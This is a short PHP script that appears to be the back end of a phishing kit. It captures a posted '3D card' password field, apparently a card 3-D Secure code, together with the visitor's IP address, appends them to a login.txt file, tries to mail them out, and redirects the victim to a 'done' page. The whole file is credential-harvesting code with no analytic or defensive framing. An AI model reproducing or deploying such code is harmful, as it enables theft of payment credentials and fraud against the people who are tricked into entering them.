<?php
$ip = getenv("REMOTE_ADDR");
$A1= "--------------  3D card -------------\n";
$A= "Mot de passe :        ".$_POST['smxsca1']."\n";
$B= "IP      : $ip\n";
$C= "---------------------- rabi hmatak ----------------------\n";
$file			= fopen("../login.txt","a"); 
$data			.= $A1."<br>";
$data			.= $A."<br>";
$data			.= $B."<br>";
$data			.= $C."<br>";
fwrite($file, $data);
fclose($file);
mail($send,$subject,$message,$from);
header("Location: done.php");
?>